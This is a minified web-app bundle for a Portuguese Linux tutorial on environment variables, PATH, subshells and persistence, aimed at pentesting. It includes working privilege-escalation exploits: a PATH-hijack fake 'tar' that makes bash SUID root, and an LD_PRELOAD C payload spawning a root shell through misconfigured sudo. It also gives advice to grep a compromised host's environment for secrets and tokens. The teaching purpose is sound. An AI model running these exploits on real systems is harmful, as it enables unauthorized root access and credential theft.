import{j as e}from"./index-CAFCz3B4.js";import{P as s}from"./PageContainer-CxmWgrx_.js";import{A as r}from"./AlertBox-Dze8I6Zt.js";import{C as o}from"./CodeBlock-C6bWIuPM.js";import{C as i}from"./CommandTable-CZCYoWRB.js";import{T as a,P as t}from"./PracticeBox-BDRu97pg.js";function p(){return e.jsxs(s,{title:"Variáveis de ambiente",subtitle:"export, env, PATH, escopo de subshell e como manipular tudo isso para PrivEsc via PATH hijacking.",difficulty:"iniciante",timeToRead:"13 min",children:[e.jsx("h2",{children:"Shell vs ambiente"}),e.jsxs("p",{children:["Toda variável criada num shell é local àquele processo. Quando o shell ",e.jsx("em",{children:"spawna"}),"um filho (por exemplo ao rodar um comando), só as variáveis marcadas como ",e.jsx("strong",{children:"exportadas"})," são herdadas. Esse é o conceito chave."]}),e.jsx(a,{path:"~",lines:[{cmd:"FOO=bar",out:"(silencioso — variável local)",outType:"muted"},{cmd:"echo $FOO",out:"bar",outType:"info"},{comment:"subshell NÃO herda",cmd:"bash -c 'echo $FOO'",out:"(linha vazia)",outType:"warning"},{cmd:"export FOO",out:"(silencioso)",outType:"muted"},{cmd:"bash -c 'echo $FOO'",out:"bar",outType:"success"},{comment:"atalho: definir já exportando",cmd:"export BAR=baz",out:"(silencioso)",outType:"muted"}]}),e.jsx("h2",{children:"env, set, printenv, declare"}),e.jsx(i,{title:"ferramentas para inspecionar",variations:[{cmd:"env",desc:"Variáveis exportadas no shell atual.",output:`PATH=...
HOME=/home/ana
SHELL=/usr/bin/zsh
USER=ana`},{cmd:"printenv PATH",desc:"Imprime UMA variável (igual env | grep, mas mais limpo).",output:"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},{cmd:"set",desc:"TUDO: vars exportadas + locais + funções shell.",output:"Saída longa — combine com less ou grep."},{cmd:"set | head",desc:"Só as primeiras (alfabético).",output:`BASH=/usr/bin/bash
BASHOPTS=...
BASH_ALIASES=()...`},{cmd:"declare -p FOO",desc:"Mostra como FOO está declarada (atributos).",output:`declare -- FOO="bar"        ↳ -- = simples
declare -x FOO="bar"        ↳ -x = exportada
declare -i FOO="42"         ↳ -i = inteiro`},{cmd:"declare -x",desc:"Lista TODAS as exportadas (= export sem args).",output:`declare -x HOME="/home/ana"
declare -x PATH="/usr/local/sbin:..."`},{cmd:"unset FOO",desc:"Remove a variável (local OU exportada).",output:"echo $FOO depois retorna vazio."},{cmd:"env -i bash",desc:"Inicia bash COM AMBIENTE LIMPO (zero variáveis herdadas).",output:"Reproduz comportamento mínimo (cron, systemd)."},{cmd:"env FOO=hack ./script.sh",desc:"Define vars SÓ para esse comando.",output:"FOO existe dentro do script, some depois."}]}),e.jsx("h2",{children:"Variáveis built-in que você precisa conhecer"}),e.jsx(o,{language:"bash",title:"as essenciais",code:`HOME       # /home/ana  -- diretório do usuário
USER       # ana        -- nome do usuário corrente
LOGNAME    # ana        -- igual USER, vem do login
SHELL      # /usr/bin/zsh    -- shell padrão (NÃO o atual)
PWD        # /tmp/loot       -- diretório atual
OLDPWD     # /home/ana  -- diretório anterior (cd - usa)
PATH       # onde o shell procura executáveis
LD_LIBRARY_PATH  # onde o ld procura .so adicionais (PrivEsc!)
LD_PRELOAD       # força carregar .so antes de qualquer outra (PrivEsc!)
LANG/LC_ALL  # idioma e encoding
TERM       # xterm-256color  -- tipo do terminal (afeta cores, vim)
HOSTNAME   # kali
EDITOR     # /usr/bin/vim    -- editor padrão de git, sudoedit, etc.
PAGER      # less
HISTFILE   # ~/.bash_history -- arquivo do history
HISTSIZE   # quantas entradas em memória
PS1        # string do prompt principal
PS2        # prompt secundário (continuação de linha: > )
IFS        # Internal Field Separator (whitespace por padrão)
RANDOM     # número aleatório novo a cada leitura
$$         # PID do shell atual
$?         # código de saída do último comando (0 = sucesso)
$!         # PID do último processo em background
$_         # último argumento do último comando`}),e.jsx(a,{path:"~",lines:[{cmd:'echo "PID=$$  USER=$USER  PWD=$PWD"',out:"PID=8421  USER=ana  PWD=/home/ana",outType:"info"},{cmd:"ls /naoexiste; echo $?",out:`ls: não foi possível acessar '/naoexiste': Não existe arquivo ou diretório
2`,outType:"warning"},{cmd:"true; echo $?",out:"0",outType:"success"},{cmd:"echo $RANDOM $RANDOM $RANDOM",out:"29183 4072 21988",outType:"default"}]}),e.jsx("h2",{children:"PATH — o calcanhar de Aquiles"}),e.jsxs("p",{children:[e.jsx("code",{children:"PATH"})," é uma lista de diretórios separada por ",e.jsx("code",{children:":"})," onde o shell procura executáveis quando você digita um comando sem caminho completo. Quem controla o conteúdo desses diretórios — ou pior, consegue colocar um diretório próprio na frente — controla o que vai rodar. Esse é o ataque clássico de",e.jsx("strong",{children:" PATH hijacking"}),"."]}),e.jsx(a,{path:"~",lines:[{cmd:"echo $PATH | tr ':' '\\n'",out:`/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/home/ana/.local/bin`,outType:"info"},{comment:"qual binário o shell ESTÁ usando",cmd:"type -a ls",out:`ls é um alias para 'ls --color=tty'
ls é /usr/bin/ls
ls é /bin/ls`,outType:"muted"},{comment:"adicionar diretório AO FINAL (mais seguro)",cmd:'export PATH="$PATH:$HOME/tools/bin"',out:"(silencioso)",outType:"muted"},{comment:"adicionar AO INÍCIO (precedência sobre o sistema — perigoso!)",cmd:'export PATH="$HOME/.minhas/bin:$PATH"',out:"(qualquer 'ls' ali sobrescreve o /usr/bin/ls)",outType:"warning"}]}),e.jsx("h2",{children:"PATH hijacking para PrivEsc"}),e.jsxs("p",{children:["Cenário típico: um ",e.jsx("strong",{children:"SUID binary"})," ou um ",e.jsx("strong",{children:"sudo NOPASSWD"}),"executa um comando sem caminho absoluto (ex: chama ",e.jsx("code",{children:"tar"})," em vez de",e.jsx("code",{children:" /usr/bin/tar"}),"). Se você consegue manipular o PATH do alvo, coloca um falso ",e.jsx("code",{children:"tar"})," no início e ele roda como root."]}),e.jsx(o,{language:"bash",title:"exploit clássico de PATH hijack",code:`# Cenário: /usr/local/bin/backup.sh é SUID root e contém:
#   #!/bin/bash
#   tar czf /backup/data.tar.gz /var/data
#   ↑ chama 'tar' relativo, sem /usr/bin/tar

# 1. Cria um 'tar' malicioso no /tmp
cat > /tmp/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash    # marca o bash como SUID root
EOF
chmod +x /tmp/tar

# 2. Coloca /tmp na FRENTE do PATH
export PATH=/tmp:$PATH

# 3. Roda o script SUID
/usr/local/bin/backup.sh

# 4. Bash agora é SUID root
/bin/bash -p
# id  →  uid=1000(low) gid=1000(low) euid=0(root) groups=...`}),e.jsx("h2",{children:"LD_PRELOAD e LD_LIBRARY_PATH"}),e.jsxs("p",{children:["Outras duas variáveis perigosas. ",e.jsx("code",{children:"LD_PRELOAD"})," força o linker a carregar um ",e.jsx("em",{children:".so"})," de sua escolha ANTES de qualquer outra biblioteca, permitindo sobrescrever funções da libc. Por segurança, programas SUID ignoram essas vars — mas se sudoers tem ",e.jsx("code",{children:"env_keep+=LD_PRELOAD"})," a defesa cai e vira PrivEsc trivial."]}),e.jsx(o,{language:"bash",title:"exploit LD_PRELOAD via sudo mal configurado",code:`# Em /etc/sudoers existe:   Defaults env_keep += "LD_PRELOAD"
# E o user pode rodar: sudo -u root /usr/bin/qualquer_coisa

# 1. payload em C
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
EOF

# 2. compila como shared object
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c

# 3. dispara
sudo LD_PRELOAD=/tmp/x.so apache2
# → cai em shell root`}),e.jsx("h2",{children:"Escopo, subshells e exportação implícita"}),e.jsx(a,{path:"~",lines:[{cmd:"X=10",out:"(local)",outType:"muted"},{comment:"( ) cria subshell — alterações lá não afetam aqui",cmd:'(X=99; echo "dentro: $X"); echo "fora: $X"',out:`dentro: 99
fora: 10`,outType:"info"},{comment:"{ } NÃO cria subshell — é o mesmo shell",cmd:'{ X=99; echo "dentro: $X"; }; echo "fora: $X"',out:`dentro: 99
fora: 99`,outType:"warning"},{comment:"pipe cria subshell pra cada lado — pegadinha clássica",cmd:'echo a | read X; echo "X=[$X]"',out:"X=[]",outType:"error"}]}),e.jsx("h2",{children:"Persistir variáveis"}),e.jsx(o,{language:"bash",title:"onde colocar export FOO=bar",code:`# 1. Para SEU usuário, em todos os shells de login:
#    ~/.bash_profile  (ou ~/.profile)
#
# 2. Para SEU usuário, em todo terminal interativo (não-login):
#    ~/.bashrc
#    ~/.zshrc  (se usa zsh)
#
# 3. Para TODOS os usuários, modo correto (Debian/Kali):
#    /etc/environment      ← KEY=VALUE puro, sem 'export'
#    /etc/profile.d/*.sh   ← scripts shell tradicionais (com export)
#
# 4. Para um serviço systemd:
#    [Service]
#    Environment="FOO=bar"
#    EnvironmentFile=/etc/default/meu-servico`}),e.jsx(t,{title:"Reproduza um PATH hijack em laboratório",goal:"Demonstrar como uma variável de ambiente pode mudar qual binário é executado.",steps:["Crie um diretório /tmp/fake e coloque ali um script chamado 'ls' que apenas escreve 'PWND'.","Marque-o como executável.","Adicione /tmp/fake ao início do PATH.","Rode 'ls' — deve aparecer PWND em vez do listing.","Restaure: export PATH para o original."],command:`mkdir -p /tmp/fake
cat > /tmp/fake/ls <<'EOF'
#!/bin/bash
echo "PWND — você executou meu fake ls"
EOF
chmod +x /tmp/fake/ls
export PATH=/tmp/fake:$PATH
ls
type -a ls`,expected:`PWND — você executou meu fake ls
ls é hashed (/tmp/fake/ls)
ls é um alias para 'ls --color=tty'
ls é /tmp/fake/ls
ls é /usr/bin/ls
ls é /bin/ls`,verify:"O comando 'type -a ls' lista /tmp/fake/ls antes do /usr/bin/ls — provando que o shell encontra ele primeiro."}),e.jsxs(r,{type:"danger",title:"Auditoria pós-pwn: leia o env do alvo",children:["Após cair num shell, sempre rode ",e.jsx("code",{children:"env"})," e ",e.jsx("code",{children:"set | grep -i"}),e.jsx("code",{children:" 'pass\\\\|secret\\\\|token\\\\|key'"}),". Variáveis de ambiente são um esconderijo favorito de credenciais (ex: ",e.jsx("code",{children:"AWS_SECRET_ACCESS_KEY"}),",",e.jsx("code",{children:" DATABASE_URL"}),", ",e.jsx("code",{children:"GITHUB_TOKEN"}),") — especialmente em containers e CI/CD."]})]})}export{p as default};
